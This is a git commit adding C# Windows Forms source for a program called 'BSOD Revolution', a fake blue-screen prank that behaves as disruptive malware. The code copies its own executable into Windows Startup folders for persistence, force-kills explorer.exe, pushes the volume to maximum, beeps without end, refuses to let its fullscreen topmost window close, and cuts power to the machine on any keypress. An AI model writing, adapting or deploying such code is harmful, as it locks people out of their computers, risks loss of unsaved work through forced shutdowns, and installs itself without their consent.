4e463829bf1fc3626834af9f13a6ec1860cf7357
jona-1993 <32371525+jona-1993@users.noreply.github.com>
2017-10-28 22:54:26 +0200

    Add files via upload

---
+++ BSOD Revolution/WindowsFormsApplication1/Form1.Designer.cs
@@ -0,0 +1,80 @@
+﻿namespace WindowsFormsApplication1
+{
+    partial class Form1
+    {
+        /// <summary>
+        /// Variable nécessaire au concepteur.
+        /// </summary>
+        private System.ComponentModel.IContainer components = null;
+
+        /// <summary>
+        /// Nettoyage des ressources utilisées.
+        /// </summary>
+        /// <param name="disposing">true si les ressources managées doivent être supprimées ; sinon, false.</param>
+        protected override void Dispose(bool disposing)
+        {
+            if (disposing && (components != null))
+            {
+                components.Dispose();
+            }
+            base.Dispose(disposing);
+        }
+
+        #region Code généré par le Concepteur Windows Form
+
+        /// <summary>
+        /// Méthode requise pour la prise en charge du concepteur - ne modifiez pas
+        /// le contenu de cette méthode avec l'éditeur de code.
+        /// </summary>
+        private void InitializeComponent()
+        {
+            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Form1));
+            this.Crashed = new System.Windows.Forms.Panel();
+            this.SuspendLayout();
+            // 
+            // Crashed
+            // 
+            this.Crashed.BackgroundImage = ((System.Drawing.Image)(resources.GetObject("Crashed.BackgroundImage")));
+            this.Crashed.Dock = System.Windows.Forms.DockStyle.Fill;
+            this.Crashed.Location = new System.Drawing.Point(0, 0);
+            this.Crashed.Name = "Crashed";
+            this.Crashed.Size = new System.Drawing.Size(1142, 624);
+            this.Crashed.TabIndex = 0;
+            this.Crashed.Visible = false;
+            this.Crashed.Paint += new System.Windows.Forms.PaintEventHandler(this.Crashed_Paint);
+            // 
+            // Form1
+            // 
+            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
+            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
+            this.BackgroundImage = ((System.Drawing.Image)(resources.GetObject("$this.BackgroundImage")));
+            this.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
+            this.ClientSize = new System.Drawing.Size(1142, 624);
+            this.Controls.Add(this.Crashed);
+            this.Cursor = System.Windows.Forms.Cursors.WaitCursor;
+            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
+            this.MaximizeBox = false;
+            this.MinimizeBox = false;
+            this.Name = "Form1";
+            this.ShowIcon = false;
+            this.ShowInTaskbar = false;
+            this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
+            this.Text = "BSOD";
+            this.TopMost = true;
+            this.WindowState = System.Windows.Forms.FormWindowState.Maximized;
+            this.FormClosing += new System.Windows.Forms.FormClosingEventHandler(this.Form1_FormClosing);
+            this.Load += new System.EventHandler(this.Form1_Load);
+            this.KeyDown += new System.Windows.Forms.KeyEventHandler(this.Form1_KeyDown);
+            this.KeyPress += new System.Windows.Forms.KeyPressEventHandler(this.Form1_KeyPress);
+            this.KeyUp += new System.Windows.Forms.KeyEventHandler(this.Form1_KeyUp);
+            this.MouseDown += new System.Windows.Forms.MouseEventHandler(this.Form1_MouseDown);
+            this.ResumeLayout(false);
+
+        }
+
+        #endregion
+
+        private System.Windows.Forms.Panel Crashed;
+    }
+}
+
---
+++ BSOD Revolution/WindowsFormsApplication1/Form1.cs
@@ -0,0 +1,162 @@
+﻿using System;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
+using System.Drawing;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using System.Threading;
+using System.Windows.Forms;
+
+
+using System.Management;
+using System.Diagnostics;
+using System.Runtime.InteropServices;
+using System.Net;
+using Microsoft.Win32;
+using System.Security.Principal;
+
+
+
+namespace WindowsFormsApplication1
+{
+    public partial class Form1 : Form
+    {
+
+        [DllImport("user32.dll")]
+        static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, int dwExtraInfo);
+
+
+        public Form1()
+        {
+            for (int i = 0; i < 100; i += 1)
+            {
+                keybd_event((byte)Keys.VolumeUp, 0, 0, 0);
+            }
+
+            InitializeComponent();
+
+            //Console.WriteLine(Environment.CurrentDirectory + "\\" + AppDomain.CurrentDomain.FriendlyName.ToString());
+            
+
+            try
+            {
+                System.IO.File.Copy(Environment.CurrentDirectory + "\\" + AppDomain.CurrentDomain.FriendlyName.ToString(), @"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\" + Environment.MachineName + ".exe");
+            }
+            catch(UnauthorizedAccessException) { }
+            catch(ArgumentException) { }
+            catch(System.IO.PathTooLongException) { }
+            catch (System.IO.DirectoryNotFoundException)
+            {
+                try
+                {
+                    System.IO.File.Copy(Environment.CurrentDirectory + "\\" + AppDomain.CurrentDomain.FriendlyName.ToString(), @" C:\Documents and Settings\" + Environment.UserName + @"\Menu Démarrer\Programmes\Démarrage\" + Environment.MachineName + ".exe");
+                }
+                catch (UnauthorizedAccessException) { }
+                catch (ArgumentException) { }
+                catch (System.IO.PathTooLongException) { }
+                catch (System.IO.DirectoryNotFoundException)
+                {
+                    try
+                    {
+                        System.IO.File.Copy(Environment.CurrentDirectory + "\\" + AppDomain.CurrentDomain.FriendlyName.ToString(), @" C:\Documents and Settings\" + Environment.UserName + @"\start menu\programs\startup\" + Environment.MachineName + ".exe");
+                    }
+                    catch (UnauthorizedAccessException) { }
+                    catch (ArgumentException) { }
+                    catch (System.IO.PathTooLongException) { }
+                    catch (System.IO.DirectoryNotFoundException) { }
+                    catch (System.IO.FileNotFoundException) { }
+                    catch (System.IO.IOException) { }
+                    catch (NotSupportedException) { }
+                }
+                catch (System.IO.FileNotFoundException) { }
+                catch (System.IO.IOException) { }
+                catch (NotSupportedException) { }
+            }
+            catch (System.IO.FileNotFoundException) { }
+            catch (System.IO.IOException) { }
+            catch (NotSupportedException) { }
+
+            Process process = new System.Diagnostics.Process();
+            ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
+
+            //startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
+            startInfo.FileName = "Taskkill.exe";
+            startInfo.Arguments = "/IM explorer.exe /F";
+            process.StartInfo = startInfo;
+            process.Start();
+
+             
+
+            new Thread(new ThreadStart(Start)).Start();
+        }
+
+        private void Form1_Load(object sender, EventArgs e)
+        {
+        }
+
+        private void Form1_MouseDown(object sender, MouseEventArgs e)
+        {
+            // System.Media.SystemSounds.Beep.Play();
+
+            Crashed.Visible = true;
+
+            Console.Beep(4000, 800);
+
+            Crashed.Visible = false;
+
+        }
+
+        void Start()
+        {
+            do
+            {
+                Console.Beep(6000, 1000);
+            }
+            while (true);
+        }
+
+        private void Form1_KeyDown(object sender, KeyEventArgs e)
+        {
+
+            if (e.KeyCode != Keys.VolumeUp)
+            {
+                //Console.WriteLine("Dans Shutdown");
+
+                 Process process = new System.Diagnostics.Process();
+                 ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
+
+                 //startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
+                 startInfo.FileName = "shutdown.exe";
+                 //startInfo.Arguments = "-r -t 1";
+                 startInfo.Arguments = "-p";
+                 process.StartInfo = startInfo;
+                 process.Start();
+
+            }
+
+        }
+
+        private void Form1_KeyPress(object sender, KeyPressEventArgs e)
+        {
+          
+        }
+
+        private void Form1_KeyUp(object sender, KeyEventArgs e)
+        {
+            //e.Handled = true;
+        }
+
+        private void Crashed_Paint(object sender, PaintEventArgs e)
+        {
+
+        }
+
+        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
+        {
+            e.Cancel = true;
+            base.OnClosing(e);
+        }
+    }
+}
